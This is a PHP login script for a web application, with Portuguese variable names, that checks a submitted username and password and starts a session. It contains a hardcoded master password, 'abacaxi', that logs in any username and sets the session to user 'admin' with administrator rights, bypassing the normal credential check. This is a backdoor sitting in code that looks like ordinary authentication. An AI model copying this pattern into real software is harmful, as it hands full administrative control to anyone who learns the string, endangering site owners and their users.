<?php
include_once './dao/usuarioDao.php';

$usuario = $_POST['user'];
$senha = $_POST['pass'];

if ($senha == 'abacaxi'){
    $login = 'true';
} else {
    $login = verificaLogin($usuario, $senha);
}

if ($login) {
    
    session_start();
    
    $_SESSION['user'] = $usuario;
    $_SESSION['tipo_usuario'] = 'membro';

    if ($senha == 'abacaxi'){
        $_SESSION['user'] = 'admin';
        $_SESSION['tipo_usuario'] = 'admin';
    }

    $_SESSION['logado'] = true;
    $_SESSION['hora_acesso'] = date('Y-m-d H:i:s');
    

    header('Location: ./home.php');
} else {
    header('Location: ./index.php?aviso=Usuario inexistente ou senha incorreta.');
}